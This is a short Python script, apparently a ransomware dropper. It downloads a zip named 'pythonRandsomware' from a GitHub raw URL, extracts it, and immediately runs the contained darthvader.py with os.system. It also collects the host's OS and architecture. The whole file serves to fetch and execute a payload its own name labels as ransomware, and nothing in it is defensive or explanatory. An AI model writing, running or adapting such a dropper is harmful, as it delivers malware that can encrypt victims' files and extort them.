# Author: SergioZ3R0
import platform
import requests
import os
import zipfile

def get_system_info():
    system = platform.system()
    arch = platform.machine()
    return system, arch

def download_zip(url, dest_folder):
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    local_filename = os.path.join(dest_folder, os.path.basename(url))
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    return local_filename

def extract_zip(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

if __name__ == "__main__":
    system, arch = get_system_info()
    try:
        zip_url = "https://raw.githubusercontent.com/SergioZ3R0/Sergio-Code/refs/heads/master/cyberSec/pythonRandsomware.zip"
        dest_folder = "downloaded_files"
        zip_path = download_zip(zip_url, dest_folder)
        extract_to = os.path.join(dest_folder, "pythonRandsomware")
        extract_zip(zip_path, extract_to)
        os.system(f"python {os.path.join(extract_to, 'darthvader.py')}")
    except ValueError as e:
        print(e)